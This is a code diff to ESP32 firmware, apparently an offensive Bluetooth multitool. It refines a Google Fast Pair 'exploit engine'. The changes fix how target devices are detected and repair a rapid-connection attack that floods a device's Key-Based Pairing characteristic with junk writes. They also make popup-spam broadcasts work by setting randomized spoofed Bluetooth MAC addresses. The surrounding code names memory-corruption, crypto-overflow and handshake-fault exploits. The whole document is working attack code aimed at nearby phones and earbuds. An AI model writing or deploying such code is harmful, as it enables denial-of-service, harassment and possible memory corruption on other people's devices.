@@ -24,6 +24,7 @@
 #include <SD.h>
 #include <algorithm>
 #include <esp_heap_caps.h>
+#include <esp_mac.h>
 #include <esp_random.h>
 #include <globals.h>
 
@@ -3305,13 +3306,11 @@ std::vector<FastPairDeviceInfo> FastPairExploitEngine::scanForFastPairDevices(in
         }
 
         uint32_t modelId = 0;
-        if (device->haveManufacturerData()) {
-            std::string manufData = device->getManufacturerData();
-            if (manufData.length() >= 3) {
-                const uint8_t *data = (const uint8_t *)manufData.data();
-                if (data[0] == 0x03 && data[1] == 0x03 && data[2] == 0x2C) {
-                    if (manufData.length() >= 9) { modelId = (data[6] << 16) | (data[7] << 8) | data[8]; }
-                }
+        if (device->haveServiceData()) {
+            std::string svcData = device->getServiceData(NimBLEUUID((uint16_t)0xFE2C));
+            if (svcData.length() >= 3) {
+                const uint8_t *sd = (const uint8_t *)svcData.data();
+                modelId = ((uint32_t)sd[0] << 16) | ((uint32_t)sd[1] << 8) | sd[2];
             }
         }
 
@@ -3369,18 +3368,27 @@ bool FastPairExploitEngine::exploitFastPairConnection(NimBLEAddress target, Fast
     }
 
     bool exploitSuccess = false;
+    bool stackTornDown = false;
     switch (exploitType) {
         case FP_EXPLOIT_MEMORY_CORRUPTION: exploitSuccess = executeMemoryCorruption(pKBPChar); break;
         case FP_EXPLOIT_STATE_CONFUSION: exploitSuccess = executeStateConfusion(pKBPChar); break;
         case FP_EXPLOIT_CRYPTO_OVERFLOW: exploitSuccess = executeCryptoOverflow(pKBPChar); break;
         case FP_EXPLOIT_HANDSHAKE_FAULT: exploitSuccess = executeHandshakeFault(pKBPChar); break;
-        case FP_EXPLOIT_RAPID_CONNECTION: exploitSuccess = executeRapidConnection(target, pKBPChar); break;
-        case FP_EXPLOIT_ALL: exploitSuccess = executeAllExploits(pKBPChar, target); break;
+        case FP_EXPLOIT_RAPID_CONNECTION:
+            exploitSuccess = executeRapidConnection(target, pKBPChar);
+            stackTornDown = true;
+            break;
+        case FP_EXPLOIT_ALL:
+            exploitSuccess = executeAllExploits(pKBPChar, target);
+            stackTornDown = true;
+            break;
     }
 
-    pClient->disconnect();
-    BLEStateManager::unregisterClient(pClient);
-    NimBLEDevice::deleteClient(pClient);
+    if (!stackTornDown) {
+        pClient->disconnect();
+        BLEStateManager::unregisterClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
+    }
 
     if (exploitSuccess) {
         showAttackProgress("FastPair exploit successful!", TFT_GREEN);
@@ -3402,6 +3410,7 @@ void FastPairExploitEngine::spamFastPairPopups(FastPairPopupType popupType, int 
 
         uint8_t mac[6];
         generateRandomMac(mac);
+        esp_iface_mac_addr_set(mac, ESP_MAC_BT);
         uint32_t modelId = selectModelForPopup(popupType);
 
         BLEStateManager::initBLE("", ESP_PWR_LVL_P9);
@@ -3410,7 +3419,9 @@ void FastPairExploitEngine::spamFastPairPopups(FastPairPopupType popupType, int 
         if (pAdvertising) {
             uint8_t fpData[14];
             createFastPairAdvertisement(fpData, modelId);
-            pAdvertising->setManufacturerData(fpData, sizeof(fpData));
+            NimBLEAdvertisementData advData;
+            advData.addData(fpData, sizeof(fpData));
+            pAdvertising->setAdvertisementData(advData);
             pAdvertising->start(0);
             delay(20);
             pAdvertising->stop();
@@ -3542,7 +3553,7 @@ bool FastPairExploitEngine::executeHandshakeFault(NimBLERemoteCharacteristic *pC
     return anySuccess;
 }
 
-bool FastPairExploitEngine::executeRapidConnection(NimBLEAddress target, NimBLERemoteCharacteristic *pChar) {
+bool FastPairExploitEngine::executeRapidConnection(NimBLEAddress target, NimBLERemoteCharacteristic *) {
     showAttackProgress("Executing rapid connection attack...", TFT_MAGENTA);
 
     bool anySuccess = false;
@@ -3555,10 +3566,14 @@ bool FastPairExploitEngine::executeRapidConnection(NimBLEAddress target, NimBLER
 
         NimBLEClient *pClient = nullptr;
         if (bleManager.connectToDevice(target, &pClient, true)) {
-            anySuccess = true;
-            uint8_t junk[100];
-            memset(junk, i % 256, sizeof(junk));
-            pChar->writeValue(junk, sizeof(junk), true);
+            NimBLERemoteService *pSvc = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+            NimBLERemoteCharacteristic *pNewChar = pSvc ? findKBPCharacteristic(pSvc) : nullptr;
+            if (pNewChar) {
+                uint8_t junk[100];
+                memset(junk, i % 256, sizeof(junk));
+                pNewChar->writeValue(junk, sizeof(junk), true);
+                anySuccess = true;
+            }
             pClient->disconnect();
             BLEStateManager::unregisterClient(pClient);
             NimBLEDevice::deleteClient(pClient);
@@ -4311,8 +4326,7 @@ String selectTargetFromScan(const char *title) {
         return "";
     }
 
-    // size_t deviceCount = snapshot->count;
-    size_t deviceCount = scannerData.deviceAddresses.size();
+    size_t deviceCount = snapshot->count;
 
     for (size_t i = 0; i + 1 < deviceCount; i++) {
         for (size_t j = i + 1; j < deviceCount; j++) {
@@ -4467,8 +4481,7 @@ String selectMultipleTargetsFromScan(const char *title, std::vector<NimBLEAddres
     std::vector<bool> selected(snapshot->count, false);
     int currentIndex = 0, scrollOffset = 0;
     bool exitMenu = false;
-    // size_t deviceCount = snapshot->count;
-    size_t deviceCount = scannerData.deviceAddresses.size();
+    size_t deviceCount = snapshot->count;
     int menuStartY = 60, menuItemHeight = 25;
     int maxVisibleItems = (tftHeight - menuStartY - 50) / menuItemHeight;
     if (maxVisibleItems > (int)deviceCount) maxVisibleItems = deviceCount;
